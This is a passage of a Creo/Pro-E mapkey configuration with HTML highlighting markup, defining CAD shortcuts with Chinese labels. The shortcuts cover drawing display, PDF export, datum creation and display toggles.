`rmb_popup` `PopupMenu`;\<br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `popupMenuRMBTimerCB`;\<br>mapkey(continued) ~ Close `rmb_popup` `PopupMenu`;\<br>mapkey(continued) ~ Command `ProCmdDwgFlipArrows@PopupMenuGraphicWinStack`;tack`;<br>mapkey noh @MAPKEY_LABEL消隐出图<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `popupMenuRMBTimerCB`;\<br>mapkey(continued) ~ Close `rmb_popup` `PopupMenu`;\<br>mapkey(continued) ~ Command `ProCmdEditProperties@PopupMenuGraphicWinStack` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `drawing_view` `options_list` <span class="hljs-number">1</span> `ViewDisp`;\<br>mapkey(continued) ~ Open `drawing_view` `disp_style_rad`;\<br>mapkey(continued) ~ Close `drawing_view` `disp_style_rad`;\<br>mapkey(continued) ~ Select `drawing_view` `disp_style_rad` <span class="hljs-number">1</span> `nohidden`;\<br>mapkey(continued) ~ Move `drawing_view` `drawing_view` <span class="hljs-number">2</span> <span class="hljs-number">9.004888</span> <span class="hljs-number">4.899316</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `drawing_view` `psh_close`;\<br>mapkey(continued) ~ Select `drawing_view` `options_list` <span class="hljs-number">1</span> `ViewDisp`;\<br>mapkey(continued) ~ Open `drawing_view` `disp_style_rad`;\<br>mapkey(continued) ~ Close `drawing_view` `disp_style_rad`;\<br>mapkey(continued) ~ Select `drawing_view` `disp_style_rad` <span class="hljs-number">1</span> `hidden`;\<br>mapkey(continued) ~ Activate `drawing_view` `psh_ok`;\<br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `popupMenuRMBTimerCB`;\<br>mapkey(continued) ~ Close `rmb_popup` `PopupMenu`;\<br>mapkey(continued) ~ Command `ProCmdEditProperties@PopupMenuGraphicWinStack` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `drawing_view` `options_list` <span class="hljs-number">1</span> `Rep`;\<br>mapkey(continued) ~ Select `drawing_view` `options_list` <span class="hljs-number">1</span> `ViewDisp`;\<br>mapkey(continued) ~ Open `drawing_view` `disp_style_rad`;\<br>mapkey(continued) ~ Close `drawing_view` `disp_style_rad`;\<br>mapkey(continued) ~ Select `drawing_view` `disp_style_rad` <span class="hljs-number">1</span> `nohidden`;\<br>mapkey(continued) ~ Activate `drawing_view` `psh_apply`;~ Activate `drawing_view` `psh_close`;\<br>mapkey(continued) se`;<br>mapkey arrow @MAPKEY_LABEL剖面箭头<span class="hljs-comment">;~ Command `ProCmdDwgAddViewArrows` ;\</span><br>mapkey(continued) @PAUSE_FOR_SCREEN_PICK<span class="hljs-comment">;;</span><br>mapkey pdf @MAPKEY_LABEL导出pdf到工作目录<span class="hljs-comment">;~ Close `main_dlg_cur` `appl_casc`;\</span><br>mapkey(continued) ~ Command `ProCmdExportPreview` <span class="hljs-comment">;~ Command `ProCmdDwgPubSettings` ;\</span><br>mapkey(continued) ~ Select `intf_profile` `pdf_export.PDFMainTab` <span class="hljs-number">1</span> `pdf_export.PDFContent`;\<br>mapkey(continued) ~ Select `intf_profile` `pdf_export.pdf_font_stroke` <span class="hljs-number">1</span> `pdf_stroke_all`;\<br>mapkey(continued) ~ Activate `intf_profile` `OkPshBtn`;~ Command `ProCmdDwgPubExport` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `file_saveas` `Current Dir`;~ Activate `file_saveas` `OK`;<br>mapkey dim @MAPKEY_LABEL标注尺寸<span class="hljs-comment">;~ Command `ProCmdDwgCrStdNewRefDim` ;\</span><br>mapkey(continued) ~ Activate `dtl_attref_ui` `psh_ent_att`;<br>mapkey cen @MAPKEY_LABEL中心线<span class="hljs-comment">;~ Command `ProCmdSketCenterline`  1;</span><br>mapkey sec @MAPKEY_LABEL新建剖面<span class="hljs-comment">;~ Command `ProCmdViewVisTool` ;\</span><br>mapkey(continued) ~ Move `visual_dlg0` `visual_dlg0` <span class="hljs-number">2</span> <span class="hljs-number">16.175953</span> <span class="hljs-number">5.282502</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `visual_dlg0` `RadioSelApplMgr` <span class="hljs-number">1</span> `xsec`;\<br>mapkey(continued) ~ Select `visual_dlg0` `ZoneCreateCasc`;\<br>mapkey(continued) ~ Close `visual_dlg0` `ZoneCreateCasc`;\<br>mapkey(continued) ~ Activate `visual_dlg0` `xsec_crt_sketch`;<br>mapkey ori @MAPKEY_LABEL定向视图<span class="hljs-comment">;~ Command `ProCmdViewVisTool` ;\</span><br>mapkey(continued) ~ Move `visual_dlg0` `visual_dlg0` <span class="hljs-number">2</span> <span class="hljs-number">11.085044</span> <span class="hljs-number">5.583578</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `visual_dlg0` `ZoneNmCreate`;\<br>mapkey(continued) ~ Input `visual_dlg0` `Table_INPUT` `M`;\<br>mapkey(continued) ~ Update `visual_dlg0` `Table_INPUT` `M`;\<br>mapkey(continued) ~ Activate `visual_dlg0` `Table_INPUT`;\<br>mapkey(continued) ~ RButtonArm `visual_dlg0` `Table` <span class="hljs-number">2</span> `m` `name_column`;\<br>mapkey(continued) ~ PopupOver `visual_dlg0` `EditPanel` <span class="hljs-number">1</span> `Table`;\<br>mapkey(continued) ~ Open `visual_dlg0` `EditPanel`;~ Close `visual_dlg0` `EditPanel`;\<br>mapkey(continued) ~ Activate `visual_dlg0` `Edit`;\<br>mapkey(continued) ~ Move `orient` `orient` <span class="hljs-number">2</span> <span class="hljs-number">16.258065</span> <span class="hljs-number">6.486804</span><span class="hljs-comment">;</span><br>mapkey dstp @MAPKEY_LABEL打开stp<span class="hljs-comment">;~ Command `ProCmdModelOpen` ;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `DLG_PREVIEW_POST` `file_open`;\<br>mapkey(continued) ~ Open `file_open` `Type`;\<br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `PREVIEW_POPUP_TIMER` \<br><span class="hljs-title">mapkey(continued) `file_open:Ph_list.Filelist:</span>&lt;NULL&gt;`;~ Close `file_open` `Type`;\<br>mapkey(continued) ~ Select `file_open` `Type` <span class="hljs-number">1</span> `filter_.stp,.step,`;<br>mapkey rel @MAPKEY_LABEL添加草绘关系<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `page_SubRibbon_control_btn` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `page_Tools_control_btn` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Command `ProCmdMmRels`;<br>mapkey poi @MAPKEY_LABEL插入基准点<span class="hljs-comment">;~ Command `ProCmdDatumPointGeneral`;</span><br>mapkey pla @MAPKEY_LABEL插入三个基准平面<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">1</span> `node1`;\<br>mapkey(continued) ~ Drag `main_dlg_cur` `PHTLeft.AssyTree` `node1`;\<br>mapkey(continued) ~ DragEnter `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">5</span> <span class="hljs-number">465</span> <span class="hljs-number">95</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">8</span> <span class="hljs-number">2</span> `main_dlg_w1` \<br>mapkey(continued) `PHTLeft.AssyTree` `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">94</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">900</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">89</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">750</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">88</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">700</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">85</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">600</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">83</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">550</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">82</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">500</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">81</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">450</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">79</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">400</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">78</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">350</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">76</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">300</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">75</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">250</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">73</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">200</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">72</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">150</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">70</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">100</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">69</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">50</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">68</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node4` <span class="hljs-number">2</span> <span class="hljs-number">472</span> <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">66</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node3` <span class="hljs-number">2</span> <span class="hljs-number">671</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">65</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node3` <span class="hljs-number">2</span> <span class="hljs-number">671</span> <span class="hljs-number">900</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">63</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node3` <span class="hljs-number">2</span> <span class="hljs-number">671</span> <span class="hljs-number">850</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">62</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node3` <span class="hljs-number">2</span> <span class="hljs-number">671</span> <span class="hljs-number">800</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragLeave `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">465</span> <span class="hljs-number">62</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> `node3` <span class="hljs-number">2</span> <span class="hljs-number">671</span> <span class="hljs-number">800</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Drop `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">5</span> <span class="hljs-number">465</span> <span class="hljs-number">62</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">8</span> <span class="hljs-number">2</span> `main_dlg_w1` \<br>mapkey(continued) `PHTLeft.AssyTree` `node3` <span class="hljs-number">2</span> <span class="hljs-number">671</span> <span class="hljs-number">800</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragFinished `main_dlg_cur` `PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Command `ProCmdDatumPlane` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">1</span> `node2`;\<br>mapkey(continued) ~ Drag `main_dlg_cur` `PHTLeft.AssyTree` `node2`;\<br>mapkey(continued) ~ DragEnter `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">5</span> <span class="hljs-number">534</span> <span class="hljs-number">183</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">8</span> <span class="hljs-number">2</span> \<br>mapkey(continued) `main_dlg_w1` `PHTLeft.AssyTree` `node1` <span class="hljs-number">2</span> <span class="hljs-number">552</span> <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">534</span> <span class="hljs-number">186</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">552</span> <span class="hljs-number">100</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">534</span> <span class="hljs-number">188</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">552</span> <span class="hljs-number">150</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">534</span> <span class="hljs-number">189</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">552</span> <span class="hljs-number">200</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">534</span> <span class="hljs-number">191</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">552</span> <span class="hljs-number">250</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">534</span> <span class="hljs-number">192</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">552</span> <span class="hljs-number">300</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">534</span> <span class="hljs-number">193</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">552</span> <span class="hljs-number">350</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">540</span> <span class="hljs-number">193</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">561</span> <span class="hljs-number">350</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">540</span> <span class="hljs-number">195</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">561</span> <span class="hljs-number">400</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">540</span> <span class="hljs-number">196</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">561</span> <span class="hljs-number">450</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">540</span> <span class="hljs-number">198</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">561</span> <span class="hljs-number">500</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">540</span> <span class="hljs-number">199</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">561</span> <span class="hljs-number">550</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">545</span> <span class="hljs-number">201</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">570</span> <span class="hljs-number">600</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">545</span> <span class="hljs-number">202</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">570</span> <span class="hljs-number">650</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">545</span> <span class="hljs-number">204</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">570</span> <span class="hljs-number">700</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">545</span> <span class="hljs-number">205</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">570</span> <span class="hljs-number">750</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">545</span> <span class="hljs-number">206</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">570</span> <span class="hljs-number">800</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">545</span> <span class="hljs-number">208</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">570</span> <span class="hljs-number">850</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">551</span> <span class="hljs-number">208</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">850</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">551</span> <span class="hljs-number">209</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">900</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">551</span> <span class="hljs-number">211</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `node1` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">557</span> <span class="hljs-number">212</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">557</span> <span class="hljs-number">214</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">563</span> <span class="hljs-number">215</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">563</span> <span class="hljs-number">218</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">568</span> <span class="hljs-number">219</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">568</span> <span class="hljs-number">221</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragOver `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">568</span> <span class="hljs-number">222</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragLeave `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">4</span> <span class="hljs-number">568</span> <span class="hljs-number">222</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Drop `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">5</span> <span class="hljs-number">568</span> <span class="hljs-number">222</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">8</span> <span class="hljs-number">2</span> `main_dlg_w1` \<br>mapkey(continued) `PHTLeft.AssyTree` `` <span class="hljs-number">2</span> <span class="hljs-number">578</span> <span class="hljs-number">950</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ DragFinished `main_dlg_cur` `PHTLeft.AssyTree`;<br>mapkey idd @MAPKEY_LABELidd破面修复<span class="hljs-comment">;\</span><br>mapkey(continued) ~ RButtonArm `main_dlg_cur` `PHTLeft.AssyTree` `node7`;\<br>mapkey(continued) ~ PopupOver `main_dlg_cur` `PM_PHTLeft.AssyTree` <span class="hljs-number">1</span> `PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Open `main_dlg_cur` `PM_PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `PM_PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Command `ProCmdRedefine@PopupMenuTree` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `maindashInst0.Idd_Pb`;<br>mapkey nod @MAPKEY_LABEL不显示基准<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` \<br>mapkey(continued) `igToolbar_AncestorIGT_IGT_GRP_inh396938342.proe_win|.mcs29658718_mp|select_\<br>mapkey(continued) all_check` <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>mapkey pod @MAPKEY_LABEL显示基准点<span class="hljs-comment">;~ Command `ProCmdEnvPntsDisp`  1;</span><br>mapkey <span class="hljs-literal">and</span> @MAPKEY_LABEL不显示注解<span class="hljs-comment">;~ Command `ProCmdEnvAnnotElemDisp`  0;</span><br>mapkey axd @MAPKEY_LABEL显示基准轴<span class="hljs-comment">;~ Command `ProCmdEnvAxisDisp`  1;</span><br>mapkey pld @MAPKEY_LABEL显示基准平面<span class="hljs-comment">;~ Command `ProCmdEnvDtmDisp`  1;</span><br>mapkey map @MAPKEY_LABEL快捷键设置<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `PREVIEW_POPUP_TIMER` \<br><span class="hljs-title">mapkey(continued) `main_dlg_w1:PHTLeft.AssyTree:</span>&lt;NULL&gt;`;~ Select `main_dlg_cur` `appl_casc`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `appl_casc`;~ Command `ProCmdRibbonOptionsDlg` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `ribbon_options_dialog` `PageSwitcherPageList` <span class="hljs-number">1</span> `env_layouts`;\<br>mapkey(continued) ~ Activate `ribbon_options_dialog` `env_layouts.Env_MapkeySet_Btn`;<br>mapkey open @MAPKEY_LABEL打开零件<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `popupMenuRMBTimerCB`;\<br>mapkey(continued) ~ Close `rmb_popup` `PopupMenu`;\<br>mapkey(continued) ~ Command `ProCmdOpenModel@PopupMenuGraphicWinStack`;<br>mapkey sty @MAPKEY_LABEL样式视图管理<span class="hljs-comment">;~ Command `ProCmdViewVisTool` ;\</span><br>mapkey(continued) ~ Move `visual_dlg0` `visual_dlg0` <span class="hljs-number">2</span> <span class="hljs-number">13.603128</span> <span class="hljs-number">5.391984</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `visual_dlg0` `PropertiesBtn`;\<br>mapkey(continued) ~ Move `visual_dlg0` `visual_dlg0` <span class="hljs-number">2</span> <span class="hljs-number">18.037146</span> <span class="hljs-number">5.528837</span><span class="hljs-comment">;</span><br>mapkey drw @MAPKEY_LABEL创建同名工程图<span class="hljs-comment">;~ Close `main_dlg_cur` `appl_casc`;\</span><br>mapkey(continued) ~ Command `ProCmdModelRename` <span class="hljs-comment">;~ Activate `rename` `Cancel`;\</span><br>mapkey(continued) ~ Select `main_dlg_cur` `appl_casc`;~ Close `main_dlg_cur` `appl_casc`;\<br>mapkey(continued) ~ Command 